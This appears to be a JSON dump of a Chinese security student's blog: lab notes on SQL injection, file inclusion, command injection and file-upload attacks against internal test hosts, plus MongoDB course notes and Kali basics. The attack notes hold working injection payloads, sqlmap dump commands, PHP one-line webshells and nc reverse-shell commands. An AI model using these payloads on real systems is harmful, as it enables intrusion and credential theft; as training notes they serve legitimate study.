用户名与sql语句合并，让原本sql语句为0，用select语句使每一列都是md5(‘1’)的值，然后在密码输入1，即可匹配，登录成功。              先做and再做or              库名表名区分大小写，列名不区分大小写                                            wordpress靶机漏洞          wpscan –url http://192.168.80.240/wordpress – enumerate p      /vane/vane.rb –url http://192.168.80.240/wordpress –enumerate p                  data/plugins.txt                    select * from xxx where ss_id=1 and 0 union select 1,version(),user(),database()#      %27-&gt;',%25-&gt;%,%5C-&gt;\\      验证是否存在漏洞：http://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 1=2      使用union select联合插查询：http://192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 and 0 union select 1,group_concat(TABLE_NAME),3,4 from information_schema.TABLES where TABLE_SCHEMA=0x776F72647072657373 group by TABLE_SCHEMA #      group_concat 把相同的行归并在一起        msyql原表注入获取信息的方法（无法获得表的名字等相关信息）          做一个测试，新建一个user表                  create schema Test;          use Test;          create table users (id INT, username, password);          insert into users values (1, ‘admin’);          select * from users;                    通过use information_schema;获得数据库所有表名                  tables 包含所有表名；          columns 包含所有字段名          select 1,2 from dual where 0 union select TABLE_SCHEMA,group_contat(TABLE_NAME) TABLE_NAME from information_schema, TABLES  where TABLE_SCHEMA=’Test’ LIMIT 1; //获取Test数据库中的所有表名          select databse(); //获取当前数据库名字          select Host,User,Passoword from user \\G;          hex(‘wordpress’); //776F72647072657373          select 776F72647072657373;                    只适用于mysql的报错法                  select * form user where 0 and extractvalue(1,version());          /*!00000 payload */          获取文件内容：http://192.168.80.240/wordpress/wp-content/plugins/wpSS/ss_handler.php?ss_id=1 and 1=0 union select 1,hex(load_file(‘/var/www/wordpress/wp-config.php’)),3,4–                      盲注sql注入方法          union select      error-based      time-based blind      猜解法-&gt;二分折半猜解法(boolean-based blind)                  需要先判断变量长度len()          192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 +                          and ascii(substr((select user() from wp_users limit 0,1),1,1))&gt;128 //通过判断网页是否变化确定猜测是否正确              and ascii(substr((select user()),1,1))=119 //user变量第一个字符是w              搜索user中的第一个字符ascii应该在0-255之前，一个一个尝试              找到对应方法，使用ord(‘a’)或者chr(111)              方法二:如果不能直接查看网页变化，可以通过是否超过5秒来判断是否符合标准                                  and if(ascii(substr((select user()),1,1))&gt;128,1,sleep(5))# //if第一个参数是true，直接执行，若是false，调用sleep                                            方法三：从页面返回时间判断是否完成,benchmark()性能判断函数                                  and if(ascii(substr((select user()),1,1))&gt;118,1,benchmark(1000000,md5(0x20)))                                                                          sql注入工具          Pangolin      Hacij      Safe3      啊D      SQLmap                  sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 –fingerprint  //判断这个url可以用哪些方式实现注入                          $_GET[‘id’]              $_POST[‘id’]              $_COOKIE[‘id’]              request.get              request.form              request.cookie              request                                sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 –dbs //获取数据库列表          sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress –tables //获取wordpress库中所有表          sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users –column //获得表中的所有列          sqlmap –url 192.168.10.50/wordpress/wp-content/plugins/wpSS/ss_load.php?ss_id=1 -D wordpress -T wp_users -C user_login,user_pass –dump //获取列中指定数据，导出数据          –count //获取数据数量          –start=1 –stop=5 //获取部分的数据          -tamper xxx.py //装载指定payload          sqlmap –purge-output\t\t//清除缓存                          数据缓存在/root/.sqlmap/output/                                          绕过WAF                  %09(tab键)代替空格          %0a（换行）%0d(回车)代替空格          使用括号          可以使用/*!00000user()*/在注释中实现运行语句                            POST方式          POST /login.php HTTP/1.1  host:xxx  User-agent:xxx  Accept:...  Content-type:...  Content-length: 30                           username=xxx&amp;password=123456          使用火狐temper data插件          注入时是请求数据包投向的url地址          sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=tt&amp;password=123456” -p username –fingerprint          sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=tt&amp;password=123456” -p username –dbs          sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko –tables   \t* sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko -T users –columns   \t* sqlmap -u “http://172.16.185.185/WackoPicko/users/login.php” –data=”username=test&amp;password=123456” -p username -D wackopicko -T users -C id,login,password –dump                    宽字符编码绕过                  php的addslash函数使得'变为\\'，在GBK编码中，若第一个字符大于%80则默认为双字符，使用%81%27，由于addslash使得变为%81%5c%27，而%81%5c则成为一个字符，从而使得单引号避免被转义          http://172.16.1.180/index.php?id=1          sqlmap 使用GET方法                    2.4 文件包含漏洞攻击  定义：服务器通过脚本代码在包含文件的时候过滤不严，从而注入一段攻击者能够控制的代码。          “本地文件包含漏洞”， 即Local File Inclusion, LFI。      如果PHP的配置选项为“all_url_include”的话，则include/require函数可以加载远程文件，这种漏洞被称为“远程文件包含漏洞”，即Remote File Inclusion, RFI。        本地文件包含漏洞          wpscan      vane      http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=/etc/passwd%00      http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://filter/read=convert.base64-encode/resource=../../../../wp-config.php%00      在Firefox浏览器中设置本地代理，用nc监听传递的数据包              把得到的字符串使用HackBar通过Base64解码PD9waHANCi8vICoqIE15U1FMIHNldHRpbmdzICoqIC8vDQpkZWZpbmUoJ0RCX05BTUUnLCAnd29yZHByZXNzJyk7ICAgIC8vIFRoZSBuYW1lIG9mIHRoZSBkYXRhYmFzZQ0KZGVmaW5lKCdEQl9VU0VSJywgJ3dvcmRwcmVzcycpOyAgICAgLy8gWW91ciBNeVNRTCB1c2VybmFtZQ0KZGVmaW5lKCdEQl9QQVNTV09SRCcsICd3b3JkcHJlc3MnKTsgLy8gLi4uYW5kIHBhc3N3b3JkDQpkZWZpbmUoJ0RCX0hPU1QnLCAnbG9jYWxob3N0Jyk7ICAgIC8vIDk5JSBjaGFuY2UgeW91IHdvbid0IG5lZWQgdG8gY2hhbmdlIHRoaXMgdmFsdWUNCg0KLy8gWW91IGNhbiBoYXZlIG11bHRpcGxlIGluc3RhbGxhdGlvbnMgaW4gb25lIGRhdGFiYXNlIGlmIHlvdSBnaXZlIGVhY2ggYSB1bmlxdWUgcHJlZml4DQokdGFibGVfcHJlZml4ICA9ICd3cF8nOyAgIC8vIE9ubHkgbnVtYmVycywgbGV0dGVycywgYW5kIHVuZGVyc2NvcmVzIHBsZWFzZSENCg0KLy8gQ2hhbmdlIHRoaXMgdG8gbG9jYWxpemUgV29yZFByZXNzLiAgQSBjb3JyZXNwb25kaW5nIE1PIGZpbGUgZm9yIHRoZQ0KLy8gY2hvc2VuIGxhbmd1YWdlIG11c3QgYmUgaW5zdGFsbGVkIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcy4NCi8vIEZvciBleGFtcGxlLCBpbnN0YWxsIGRlLm1vIHRvIHdwLWluY2x1ZGVzL2xhbmd1YWdlcyBhbmQgc2V0IFdQTEFORyB0byAnZGUnDQovLyB0byBlbmFibGUgR2VybWFuIGxhbmd1YWdlIHN1cHBvcnQuDQpkZWZpbmUgKCdXUExBTkcnLCAnJyk7DQoNCi8qIFRoYXQncyBhbGwsIHN0b3AgZWRpdGluZyEgSGFwcHkgYmxvZ2dpbmcuICovDQoNCmRlZmluZSgnQUJTUEFUSCcsIGRpcm5hbWUoX19GSUxFX18pLicvJyk7DQpyZXF1aXJlX29uY2UoQUJTUEFUSC4nd3Atc2V0dGluZ3MucGhwJyk7DQoNCmRlZmluZSgnUkVMT0NBVEUnLHRydWUpOw0KPz4=&lt;?php                  // ** MySQL settings ** //          define('DB_NAME', 'wordpress');    // The name of the database          define('DB_USER', 'wordpress');     // Your MySQL username          define('DB_PASSWORD', 'wordpress'); // ...and password          define('DB_HOST', 'localhost');    // 99% chance you won't need to change this value          // You can have multiple installations in one database if you give each a unique prefix           $table_prefix  = 'wp_';   // Only numbers, letters, and underscores please!          // Change this to localize WordPress.  A corresponding MO file for the\t          // chosen language must be installed to wp-includes/languages.          // For example, install de.mo to wp-includes/languages and set WPLANG to 'de'          // to enable German language support.          define ('WPLANG', '');          /* That's all, stop editing! Happy blogging. */          define('ABSPATH', dirname(__FILE__).'/');          require_once(ABSPATH.'wp-settings.php');          define('RELOCATE',true);          ?&gt;                    远程文件包含漏洞all_url_include()                  PHP中函数system\\passthru\\exec\\exec_once可以实现执行系统命令          http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=php://input%00          Enable Post Data: &lt;?system(“/sbin/ifconfig”)?&gt;/&lt;?system(“uname -a”)?&gt;          使用伪协议直接用get方式:http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php system(“id”);?&gt;%00          把php指令经过base64编码和url编码，替换原来的          http://172.16.1.227/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTs%2fPg%3D%3D%00                    2.5 命令注入漏洞攻击(Remote Command Execution, RCE)  服务器通过脚本代码在 执行命令的时候过滤不严，从而注入一段攻击者能够 控制的代码，从而在服务器上以Web服务的后台权限 远程执行恶意指令。  nslookup 加分号再加别的命令可以获取linux信息。          一般可以实现读写的文件                  /tmp          /sbin/ifconfig          /etc/passwd          /var/www                      nc监听，连接反弹shell          nc 172.16.185.167 -nlp 443      nc 172.16.185.167 443 -e /bin/sh      dirtycow提权        dvwa          user/user      源码位置： /var/www/dvwa/vulnerabilities/exec/source/      `shell_command` 执行shell_command命令      $(shell_command) 执行shell_command命令      | shell_command 执行shell_command命令并返回结果      || shell_command 执行shell_command命令并返回结果      ; shell_command 执行shell_command命令并返回结果      &amp;&amp; shell_command 执行shell_command命令并返回结果      &gt; target_file 返回结果覆盖到target_file里      &gt;&gt; target_file 返回结果追加到target_file里      &lt; target_file 把target_file的内容输入到之前的命令当中                        operator 给目标指令添加额外的参数                    2.6 文件上传漏洞攻击  Webshell          大马/小马      权限问题和功能问题      kali：weevely        小马          CKnife      蚁建      altman        CKnife          ctrl+l 文件管理器输入地址      解压ckinfe，到路径下，      java -jar Cknife.jar运行ckinfe      @eval(_$POST('cmd'));一句话木马      hackbar中postdata中输入cmd= echo hello;      第一题                  上传文件过程中，当需要检验文件格式时，若是前端检验，可以修改审查元素          还可以修改文件格式，使用burpsuite抓包，在浏览器中使用本地代理，修改包的内容，改文件名          之后使用Ckinfe获取服务器结构                    第二题(MIME类型验证)                  在burpsuite里修改文件类型为image/jpeg,然后就能避开检验          image/jpeg                    第三题（文件扩展名的黑名单验证）                  strchr找第一个符合条件          strrchr找最后一个符合条件          修改可以上传文件的后缀为php3，php4，php5                    第四题 文件内容格式验证                  getimagesize($file_name);通过文件头部获得文件大小          在木马中加入GIF89a即可绕过检测，被服务器判断是gif文件          总结：改成合法类型、改成php3、改成合法的文件头                    第五题 文件拓展名白名单验证–子目录劫持                  篡改子目录upload/yyy.php%00/xxx.jpg\t \t* 在burpsuite中修改image改成tiny.php，再把proxy-hex中找到并把php之后的一个字节改为00。                            文件上传漏洞攻击                    提权大杀器工具，令牌攫取漏洞 pr                  神器：熟练掌握sqlmap,nmap,burpsuite,metaspolit,setoolkit                    2.7 文件上传漏洞上传文件攻击：IIS6.0解析ASP漏洞  服务器上可执行文件名为.cer.cdx.asc  cer证书最后加上小马@eval(_$POST('cmd'));实现。  在文件夹名为xxx.asp目录下，里面可以实现任意拓展名的文件都会在服务器上执行。  小马的文件名设置成pp.asp;.jpg  防御方法：服务器保存文件时自己定义文件名保存，不相信用户的输入nginx解析php漏洞  nginx&lt;=0.8.37,用户访问xxx.jpg/xxx.php时服务器会把xxx.jpg当做PHP文件解析使用网页编辑器中的漏洞IIS6解析漏洞攻击fckeditor/eitor/filemanager/uploadfckeditor/eitor/filemanager/browser/default/connectors/asp/connector.asp  tamperdata查看服务器版本和类型：192.168.1.222/EditNews.html  查看fckeditor版本：192.168.1.222/fckeditor/_whatsnew.html  http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp  http://192.168.1.222/fckeditor/editor/filemanager/browser/default/browser.html?connector=connectors/asp/connector.asp&amp;type=Image  192.168.1.222/userfiles/image/fck.asp/littlec01dstudy.jpg  直接上传littlec01dstudy.asp;.jpg文件同样可以直接运行文件内容192.168.1.222/userfiles/image/littlec01dstudy.asp;.jpg  或者在如下url中使用类似方法          192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/test.html      192.168.1.222/fckeditor/editor/filemanager/upload/test.html      192.168.1.222/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Com mand=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=%2F      2.8 Web应用组件攻击Kali：  whatWebWeb应用服务和框架组件攻击      Joomla3.2.1          whatweb/zoomeye/shodan.io搜索相关信息      在exploit-db.com找到相关漏洞                  192.168.10.100/index.php/weblinks-categories?id=0 ) union select password from nnla5_users – )          192.168.10.100/index.php/weblinks-categories?id=0 ) union select concat(0x5b,username,0x3a,password,0x5d) from nnla5_users limit 0,1 – )          192.168.10.100/index.php/weblinks-categories?id=0%20%29%20union%20select%20password%20from%20%60nnla5_users%60%20–%20%29          admin:admin123          sqlmap -u ‘http://192.168.10.100/index.php/weblinks-categories?id=0’ –level=3 –dbs 把注入的语句用代替，使用*告知sqlmap在这里注入成功率较高                          sqlmap：相比level1，level3是尝试更多的注入              sqlmap -u ‘http://192.168.10.100/index.php/weblinks-categories?id=0*’ –level=3 –dbs                                                wordpress          Kali:wpscan                  主要使用plugin和数据库相关指令          wpscan -u http://192.168.10.116/wordpress –enumerate p          192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;php @eval($_POST[‘cmd’]);//\twordpress一句话木马          绕过方法：RFI to get shell                          192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_POST[‘cmd’]);?&gt;              data:text/plain,&lt;?php @eval($_POST[‘cmd’]);?&gt;              data:text/plain,&lt;?php @eval($_POST[‘cmd’]);//              发现可以执行phpinfo指令，192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=phpinfo();              192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=passthru(‘mysql -u wordpress -pwp_pass888 -A wordpress -e “show tables;”’);              192.168.10.116/wordpress/wp-content/plugins/mygallery/myfunctions/mygallerybrowser.php?myPath=data:text/plain,&lt;?php @eval($_GET[‘cmd’]);?&gt;&amp;cmd=passthru(‘mysql -u wordpress -pwp_pass888 -A wordpress -e “select * from wp_users;”’);              passthru执行系统命令并且回显：-p后面不能有空格，要直接连接密码；单双引号使用分开，否则会不正常闭合                                sqli to get shell                          admin:wp_@dm!n                                插件实现WordPress渗透：jetpack          上传插件时加入一句话木马          上传路径在/wordpress/wp-content/plugins/akismet,在该路径下实现了渗透                    问题  SQL注入时select count(*),(floor(rand(0)*2))x from information_schema.tables group by x;实际情况如下面的例子select count(*) from TSafe group by floor(rand(0)*2);          表中必须有3条以上的记录才会报错      rand()函数的随机因子若不取，则会随机报错，设为固定值如rand(0)，如表中有3条以上数据，就一定报错。      原理：                  执行该条语句时，先建立虚表          floor(rand(0)*2)的返回值是011011…且查询时rand()会被反复执行，即在查询过程中每次匹配会重新计算rand()的值          011011..第一次查询0，没有重新计算为1，产生第一条数据；第二次查询1，有count则直接加1为2；第三次查询0没有重新计算为1，此时有1但是仍要插入1，重复报错。                      [关键]在使用虚拟机的时候会遇到内存不足的情况，直接修改Vmware里的硬盘大小会导致虚拟机重启后无法开机。解决办法是需要重新划分硬盘和设置交换区，使用fdisk和mkswap等工具实现。"
  },
  
  {
    "title": "MongoDB自学笔记",
    "url": "/posts/MongoDB/",
    "categories": "",
    "tags": "Website",
    "date": "2017-11-07 00:00:00 -0800",
    





    
    "snippet": "MongoDB 实战[美] Kyle Banker1. 主要特性1.1 文档数据模型类似于Json的格式来存储数据，不需要像关系型数据库那样在遇到一对多的情况下要写多张表。1.2 即时查询MongoDB实现类似即时查询的方法：db.posts.find({'tags': 'politics', 'vote_count':{'gt': 10}});1.3 二级索引B-tree1.4 复制通过副...",
    "content": "MongoDB 实战[美] Kyle Banker1. 主要特性1.1 文档数据模型类似于Json的格式来存储数据，不需要像关系型数据库那样在遇到一对多的情况下要写多张表。1.2 即时查询MongoDB实现类似即时查询的方法：db.posts.find({'tags': 'politics', 'vote_count':{'gt': 10}});1.3 二级索引B-tree1.4 复制通过副本集的拓扑结构实现复制功能。副本集有一个主节点和多个从节点组成，主节点可以读写、子节点只能读；若主节点故障，则自动从子节点找替代。1.5 速度和持久性速度指操作数据的时间多少；持久性指数据能维持的时间长短；MongoDB可以设置是否开启Journaling日志记录1.6 数据库扩展分片1.7 命令行工具  备份和恢复数据库:mongodump/mongorestore  导入导出JSON/CSV/TSV数据: mongoexport/mongoimport2. MongoDB Shell常用指令  db.users.save()/db.users.insert()\t添加项  db.users.count()\t计数  db.users.find()\t\t查询  db.users.update({username:\"smith\"}, {$set: {country: \"Canada\"}})\t增加国家属性  db.users.update( {username: \"smith\"}, { $set: {favorits: { cities:[\"Chicago\", \"Cheyenne\"], movies: [\"Casablanca\", \"The Sting\"] } }})  db.users.remove()\t\t删除数据  db.users.drop()\t\t删除所有索引  db.numbers.ensureIndex({num:1}) \t为num键创建索引  数据库基本操作          show dbs      show collections      db.stats()/db.numbers.stats()\t获取数据库/集合底层信息      3. 使用MongoDB编写程序rubyMongoDB权威指南[美]Kristina Chodorow &amp; Michael DirolfMongoDB UniversityM101P: MongoDB for DevelopersChapter 1: Introduction1.1 db.collection.insert(), db.collection.find().pretty() we can use pretty() to configure the cursor to display results in an easy-to-read format.1.2 cursor.hasNext()/next() is used to list the whole collections by the cursor.1.3 del(g['name']) is uesd to delete a item in a python dictionary.1.4 curl -i locolhost:8080 can get a header and content back.1.5 set cookie which is got by Get methodfruit = bottle.request.forms.get(\"fruit\")bottle.response.set_cookie(\"fruit\", fruit)bollle.redirect(\"/show_fruit\") Chapter 3: Schema Design3.1 foreign key constraintsChapter 4: Performance4.1 Pluggable storage engines inclues MMAP(default) and WiredTiger(2014)  WiredTiger: Document Level Concurrency, Compress on data4.2 Index  create Index: db.students.createIndex({student_id:1});  delete Index: db.students.dropIndex({student_id:1});create Index on tags      elemMatch: db.students.explain().find({'scores':{$elemMatch: {type:'exam'. score:{'$gt':99.8}}}}); it is used to meet the requirements in the search.    create unique index: db.stuff.createIndex({thing:1}, {unique:true});  delete the same item: db.stuff.remove({thing:'apple'}, {justOne: true});  sparse index: can not be used for sorting  create the Index in the background: db.students.createIndex({'scores.score':1},{background:true});  Explain: Verbosity  Covered Queries: search require and result are all index          all the fields in the query are part of an index;      all the fields returned in the results are in the same index      db.collection.find(query, projection): query(query requirement), projection(display return keys)        Geospatial Index:          ensure Index: db.stores.ensureIndex({location: 2d, type:1});      db.stores.find({location:{$near:[50,50]}});        Geospatial Spherical: Longitude, Latitude. Using GeoJSON          db.places.ensureIndex({'location':  '2dsphere'});      db.places.find({location: {$near: {$geometry: {type: \"Point\", coordinates: [122,37]}, $masDistance: 2000}}});      db.stores.find({loc: {$near: {$geometry: {type: \"Point\", coordinates: [-130,39]}, $maxDistance: 1000000}}});        Text Indexes: db.sentences.ensureIndex({'words': 'text'});          db.sentences.find({$text:{$search:'dog tree obsidian'}}, {Score:{$meta: 'textScore'}}).sort({score:{$meta:'textScore'}}); The command will list the text by the similarity of the words.      db.students.dinf({student_id:{$gt: 500000}, class_id: 54}).sort({student_id:1}).hint({class_i:1}).explian(\"executionStats\")      query order: equality-sort-range      4.3 Profile mode  0: nolog  1: log slow query  2: log every query  command: mongod -dbpath /usr/local/var/mongodb --profile 1 --slowms 2  db.system.profile.find({ns:/test.foo/}).sort({ts:1}).pretty()  db.system.profile.find({millis:{$gt:1}}).sort({ts:1}).pretty()Answer4.3db.posts.ensureIndex({ date : -1});db.posts.ensureIndex({ tags : 1,  date : -1});db.posts.ensureIndex({ permalink : 1});5. Aggregation Framework5.1 count the sum:db.products.aggregate([\t{ $group: \t\t{\t\t\t\"_id:\"$category\", \t\t\t\"num_products\":{\"$sum\":1}\t\t}\t}]); 5.2 aggregation pipeline  $project  $match  $group  $sort  $skip  $limit  $unwind  $out  $redata  $geonear5.3 aggregation expressions aggregate([stage1, stage2],{options})  $sum: db.zips.aggregate([{\"$group\": {\"_id\":\"$state\",\"population\":{$sum:\"$pop\"}}}]), sum population grouped as state  $avg: db.zips.aggregate([{$group: {\"_id\":\"$state\",\"average_pop\":{$avg:\"$pop\"}}}])  $min  $max: db.zips.aggregate([{$group: {_id: \"$state\", pop: {$max:\"$pop\"}}}])  $push  $addtoSet: db.zips.aggregate([{$group: {\"_id\":\"$city\", \"postal_codes\":{$addToSet:\"$_id\"}}}])  $first/$last: must be used after sorts      $project      db.products.aggregate([      {$project:   \t{   \t\t_id:0,   \t\t'maker': {$toLower:\"$manufacturer\"},   \t\t'details': {'category': \"$category\",          \t\t\t\t'price' : {\"$multiply\":[\"$price\",10]}          \t\t\t},   \t\t'item':'$name'   \t}      }  ])      If you want to include a key exactly as it is named in the source document, you just write key:1, where key is the name of the key.db.zips.aggregate([{$project: {_id: 0, city: {$toLower: \"$city\"}, pop:1, state:1, zip:\"$_id\"}}])  $match: db.zips.aggregate([{$match: { pop: {$gt:100000}}}])  $text:  $sort: db.zips.aggregate([{ $sort:{state:1, city:1}}])  $unwind: unjoin the data  $out:(new in Mongodb2.6),rewrite the collection  {explain:true},{allowDiskUse:true}5.4 Homework5.4.1 db.posts.aggregate([{$unwind: \"$comments\"},{$group:{_id: \"$comments.author\",count : {$sum:1}}},{$sort:{count:-1}}]) This task need to count the comments’ author’s sum which is in the subJson. Need to be rejoin the whole Json.5.4.2 the result is smaller than the correct answer but it is near. Do not figure out the reason.db.zips.aggregate([\t{$match:{ $or: [{state:\"CA\"}, {state:\"NY\"}]}},\t{$match: {pop: {$gt:25000}}},\t{$group: {_id:0, avg: {$avg:\"$pop\"}}}])5.4.3db.grades.aggregate([\t{ $unwind: \"$scores\" },\t{ $match: { $or: [ {\"scores.type\": \"homework\"}, {\"scores.type\":\"exam\"} ] } },\t{ $group: { _id: { 'student_id': \"$student_id\", 'class_id': \"$class_id\" }, avg: { $avg: \"$scores.score\" } } },\t{ $group: { _id: \"$_id.class_id\", class_avg: { $avg: \"$avg\" } } },\t{ $sort: { 'class_avg': -1 } }])5.4.4db.zips.aggregate([{ $project: { _id: 0, city: 1, pop: 1 } },{ $match: { city: /^(B|D|O|G|N|M).*/ } },{ $group: { _id: null, pop: { $sum: \"$pop\" } } },{ $sort: { city: 1} }])5.5 the different between $group and $project6. Application Engineering6.1 Write Concern:  w: whether the application wait for the server’s acknowledge during the response. 1(wait)/0(not)  j: whether the application wait for the server’s response on writing the disk. Ture(wait)/False(not)6.2 Replica Set# script to create 3 replica sets: sudo bash &lt; ./create_replica_set.sh#!/usr/bin/env bashmkdir -p /data/rs1 /data/rs2 /data/rs3mon\tgod --replSet m101 --logpath \"1.log\" --dbpath /data/rs1 --port 27017 --oplogSize \t64 --fork --smallfilesmongod --replSet m101 --logpath \"2.log\" --dbpath /data/rs2 --port 27018 --oplogSize \t64 --smallfiles --forkmongod --replSet m101 --logpath \"3.log\" --dbpath /data/rs3 --port 27019 --oplogSize \t64 --smallfiles --fork# init the replica setconf\tig = { _id: \"m101\", members:[          { _id : 0, host : \"localhost:27017\"},          { _id : 1, host : \"localhost:27018\"},          { _id : 2, host : \"localhost:27019\"} ]};rs.initiate(config);rs.status();  Reading from a secondary set: rs.slaveOk()(rs means replica set)  connect to different database: mongo --port 27017/8/9  secondaries use oplog to synchronize the primary dataset.  shut down the dataset: rs.stepDown()6.3 Failover and Rollback"
  },
  
  {
    "title": "安全笔记概论",
    "url": "/posts/%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/",
    "categories": "",
    "tags": "Security",
    "date": "2017-10-27 00:00:00 -0700",
    





    
    "snippet": "1 概论  攻击流程          预攻击：收集信息，进行决策      攻击：进行攻击，获得权限，进行渗透      后攻击：长期控守，维持权限，消除痕迹        APT攻击（高级持续性攻击）          定向信息收集：针对性收集，包括网络隐蔽扫描和社工方法      外网攻击突破：恶意代码攻击个人终端或者单位服务器      构建控制通道：采用HTTP、HTTPS、DNS...",
    "content": "1 概论  攻击流程          预攻击：收集信息，进行决策      攻击：进行攻击，获得权限，进行渗透      后攻击：长期控守，维持权限，消除痕迹        APT攻击（高级持续性攻击）          定向信息收集：针对性收集，包括网络隐蔽扫描和社工方法      外网攻击突破：恶意代码攻击个人终端或者单位服务器      构建控制通道：采用HTTP、HTTPS、DNS等协议，绕过安全防护设备      内部横向渗透：以终端主机和DMZ区，在系统内部多层渗透，攻击更多服务器获得更多权限。      数据收集上传      攻击痕迹清理        知识框架          信息收集      突防攻击      隐蔽控守      2. Kali Linux基础2.1 linux分支* RedHat\t* CentOS\t*  RedHat* Debian\t* Ubuntu \t* Linxu* Slackware* 查看内核版本号\t* uname -a\t* cat /proc/version cat /etc/issue\t* cat /etc/os-release 2.2 Kali基础介绍  Linux文件目录结构          etc 配置目录      bin 用户自带的可执行文件 or /usr/bin      boot 引导      media 虚拟机共享目录      mnt \tU盘加载目录      proc 查看进程信息      sbin\t系统自带的可执行文件（system）      tmp 临时目录（重启全部清空，所有用户都能读写）      usr 用户安装软件 工具在/usr/share路径下        Kali基本操作          ifconfig                  lo：本地回环127.0.0.1                    ln创建链接                  硬链接：文件的两个副本          符号链接：快捷方式 ln -s 源文件 链接文件                    more：按页显示文件      less：按页显示文件，可以翻页      head -n file：显示文件前n行      tail -n file：显示文件后n行      umask 设置文件权限屏蔽位，取反即是新建文件默认权限      chown user file 修改文件所有者      chgrp 修改文件所有组              对应后缀的文件加密                                            命令              文件后缀                                                          gzip,gunzip              .gz                                      zip,unzip              .zip                                      tar              .tar                                      compress,bzip2              .bz2                                          磁盘管理命令                  du 显示文件和目录空间占用情况          df 显示磁盘文件系统的相关信息          mount/umount 安装/卸载文件系统                    用户管理                  id 显示当前用户信息          adduser 增加用户          passwd \t更改用户密码          userdel\t删除用户          traceroute 测试和远程主机的路由情况          ps 显示进程及状态          kill [进程id]杀死进程                      netstat -t\t//只看tcp连接          netstat -nt //不将IP地址反向解析为主机名或域名      netstat -ant\t//本机监听连接（all）      netstat -antp  //process与进程关联起来      windows： netstat -an -p tcp      ps -aux | grep 2120 //打印所有进程，匹配2120进程      postgresql 5432端口        网卡配置(配置静态IP地址)：          修改网卡配置/etc/network/interfaces                  auto eth0          iface eth0 inet static          address 192.168.80.30          netmask          geteway                    修改域名服务器地址 /etc/resolv.conf      重启网络: /etc/init.d/networking restart or reboot        Kali 服务管理          Web服务器根目录 /var/www/html/      apache2/postgresql      配置服务自启动：update-rc.d postgresql enable            替换更新源为国内源/etc/apt/sources.list      中科大kali源  deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  阿里云kali源  deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib  deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib    * advanced package tool(apt)   * apt-get update/upgrade \t//下载更新列表/更新对应软件   * apt-get dist-upgrade\t\t//下载对应依赖包   * apt-get clean\t\t\t\t//清除冗余文件        Vmware Tools(滚动更新版)          apt -y install open-vm-tools-desktop fuse      reboot        安装VPN          安装openvpn      2.3 Kali 进阶使用  环境变量          env                  env | grep -i path //-i忽略大小写          echo $PATH                      搜索          whereis/which ifconfig //在$PATH和$MANPATH能找到ifconfig/在$PATH      locate 在updatedb数据库中匹配字符串      find /（指定目录） -type f（文件）、d（目录） -name（指定名称）        netcat 瑞士军刀          nc -nlp  -vv 监听端口                  nc -p 443 指定端口号监听443端口          nc -l 监听（服务端）          nc -n 不解析域名          nc -vv 详细信息          实现服务器端获得客户端的shell                          nc -lnp &lt;（服务器端）ip&gt;   //服务器监听开启              nc &lt;（服务器）ip&gt;  -e（执行程序） /bin/sh  //客户端把shell传递给服务器，就可以在服务器上输入指令控制客户端              /bin/sh linux类似于Windows的cmd接口程序                                            kali服务器客户端          python轻量级web服务器                  python -m SimpleHTTPServer 80                    wget  -O /tmp/1.exe\t\t//-O实现在指定目录下保存        软件工具的安装          apt                  apt-cache search/show packagename 搜索包          apt-get install packagename –reinstall 安装/重新安装          apt-get remove packagename 删除包          apt-get autoclean 清理无用包          apt-get check 检查是否有损害                    dpkg                  dbkg -i package-deb                    git      下载源代码压缩包                  wget (tgz)          tar -xzvf archive.tar.gz          ./configure          make          make install                    3. 信息收集3.1 网络信息收集  网络信息收集          whois数据库：查询Internet注册信息的标准协议、域名提供商、域名服务器                  whois                     域名查询：查询DNS服务器                  nslookup                          baidu.com              set type=ns/A/mx              server ns1.cnhubei.com              ls cnhubei.com                                host -t mx baidu.com                          host -l sda.gov.cn ns.sda.gov.cn 